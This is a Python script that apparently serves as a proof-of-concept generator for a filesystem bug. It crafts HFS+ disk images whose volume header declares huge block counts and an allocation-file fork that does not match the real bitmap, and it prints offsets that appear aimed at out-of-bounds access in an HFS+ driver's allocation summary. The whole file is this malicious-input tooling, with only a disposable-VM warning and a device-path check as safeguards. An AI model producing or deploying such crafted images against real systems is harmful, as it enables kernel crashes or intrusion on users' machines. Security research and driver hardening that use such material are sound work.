#!/usr/bin/env python3
"""Build a sparse HFS+ image that mismatches volume and bitmap geometry.

This only edits regular image files. Mount generated images in a disposable VM.
"""

from __future__ import annotations

import argparse
import os
import shutil
import struct
from pathlib import Path


VH_OFFSET = 1024
VH_SIZE = 512
BLOCK_SIZE_OFFSET = 40
TOTAL_BLOCKS_OFFSET = 44
FREE_BLOCKS_OFFSET = 48
ALLOCATION_FORK_OFFSET = 112
FORK_LOGICAL_SIZE_OFFSET = 0
FORK_TOTAL_BLOCKS_OFFSET = 12
FORK_EXTENTS_OFFSET = 16


def be16(data: bytes, offset: int) -> int:
    return struct.unpack_from(">H", data, offset)[0]


def be32(data: bytes, offset: int) -> int:
    return struct.unpack_from(">I", data, offset)[0]


def round_up(value: int, alignment: int) -> int:
    return (value + alignment - 1) & ~(alignment - 1)


def build(args: argparse.Namespace) -> None:
    source = args.source.resolve()
    output = args.output.resolve()
    if source == output:
        raise SystemExit("source and output must differ")
    if str(output).startswith("/dev/"):
        raise SystemExit("refusing to write a device path")

    with source.open("rb") as stream:
        stream.seek(VH_OFFSET)
        original_vh = stream.read(VH_SIZE)
        stream.seek(args.bitmap_source_block * args.block_size)
        original_bitmap = stream.read(args.block_size)

    if len(original_vh) != VH_SIZE or be16(original_vh, 0) not in (0x482B, 0x4858):
        raise SystemExit("source is not an HFS+ or HFSX image")
    if be32(original_vh, BLOCK_SIZE_OFFSET) != args.block_size:
        raise SystemExit("source block size does not match --block-size")
    if len(original_bitmap) != args.block_size:
        raise SystemExit("could not read the source allocation-bitmap block")

    bitmap_logical_size = round_up((args.total_blocks + 7) // 8, args.block_size)
    mapped_blocks = bitmap_logical_size // args.block_size
    extent_blocks = 1 if args.small_extent else mapped_blocks
    image_size = args.total_blocks * args.block_size

    if args.allocation_start + extent_blocks > args.total_blocks:
        raise SystemExit("allocation extent exceeds declared volume")

    vh = bytearray(original_vh)
    struct.pack_into(">I", vh, TOTAL_BLOCKS_OFFSET, args.total_blocks)
    struct.pack_into(">I", vh, FREE_BLOCKS_OFFSET, max(1, args.total_blocks - 0x2000))

    fork = ALLOCATION_FORK_OFFSET
    struct.pack_into(">Q", vh, fork + FORK_LOGICAL_SIZE_OFFSET, bitmap_logical_size)
    struct.pack_into(">I", vh, fork + FORK_TOTAL_BLOCKS_OFFSET, args.allocation_total_blocks)
    struct.pack_into(">II", vh, fork + FORK_EXTENTS_OFFSET,
                     args.allocation_start, extent_blocks)
    for index in range(1, 8):
        struct.pack_into(">II", vh, fork + FORK_EXTENTS_OFFSET + index * 8, 0, 0)

    output.parent.mkdir(parents=True, exist_ok=True)
    shutil.copyfile(source, output)
    fd = os.open(output, os.O_RDWR)
    try:
        os.ftruncate(fd, image_size)
        os.pwrite(fd, vh, VH_OFFSET)
        os.pwrite(fd, original_bitmap, args.allocation_start * args.block_size)
        os.pwrite(fd, vh, image_size - VH_OFFSET)
        os.fsync(fd)
    finally:
        os.close(fd)

    print(f"output={output}")
    print(f"logical_image_size=0x{image_size:x}")
    print(f"total_blocks=0x{args.total_blocks:x}")
    print(f"bitmap_logical_size=0x{bitmap_logical_size:x}")
    print(f"allocation_total_blocks=0x{args.allocation_total_blocks:x}")
    print(f"allocation_extent=0x{args.allocation_start:x}+0x{extent_blocks:x}")
    print(f"summary_allocation_bytes={(args.allocation_total_blocks // 8) + 1}")
    print(f"max_summary_byte_index~0x{(args.total_blocks - 1) // (args.block_size * 64):x}")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser()
    parser.add_argument("source", type=Path)
    parser.add_argument("output", type=Path)
    parser.add_argument("--total-blocks", type=lambda value: int(value, 0), default=0x02000000)
    parser.add_argument("--allocation-total-blocks", type=lambda value: int(value, 0), default=1)
    parser.add_argument("--allocation-start", type=lambda value: int(value, 0), default=0x1000)
    parser.add_argument("--bitmap-source-block", type=lambda value: int(value, 0), default=1)
    parser.add_argument("--block-size", type=lambda value: int(value, 0), default=4096)
    parser.add_argument("--small-extent", action="store_true",
                        help="keep the allocation extent at one block (sparse-fork variant)")
    args = parser.parse_args()
    if not 1 <= args.total_blocks <= 0xFFFFFFFF:
        parser.error("--total-blocks must fit in uint32")
    if not 1 <= args.allocation_total_blocks <= 0xFFFFFFFF:
        parser.error("--allocation-total-blocks must fit in uint32")
    return args


if __name__ == "__main__":
    build(parse_args())
